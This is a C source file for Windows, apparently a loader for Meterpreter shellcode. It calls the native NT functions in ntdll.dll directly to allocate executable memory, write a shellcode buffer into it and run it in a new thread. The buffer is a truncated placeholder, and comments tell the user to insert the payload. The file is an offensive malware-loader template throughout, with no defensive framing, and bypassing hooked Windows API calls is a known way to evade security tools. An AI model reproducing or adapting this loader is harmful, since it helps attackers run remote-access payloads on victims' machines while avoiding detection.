#include <stdio.h>
#include <windows.h>


// If NTSTATUS is not defined, define it here
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// Define the calling convention for the functions if not already defined
#ifndef NTAPI
#define NTAPI __stdcall
#endif

// Define typedefs for function pointers to the native API functions we'll be using.
// These match the function signatures of the respective functions.
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);


int main() {
    // Insert Meterpreter shellcode here.
    unsigned char code[] = "\xfc\x48\x83...";

    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");

    // Ensure that all function pointers are valid
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject) {
        printf("Failed to load native API functions.\n");
        return 1;
    }

    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
    // 'exec' will hold the base address of the allocated memory region.
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region.
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread.
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the thread to finish executing.
    NtWaitForSingleObject(hThread, FALSE, NULL);

    return 0;
}
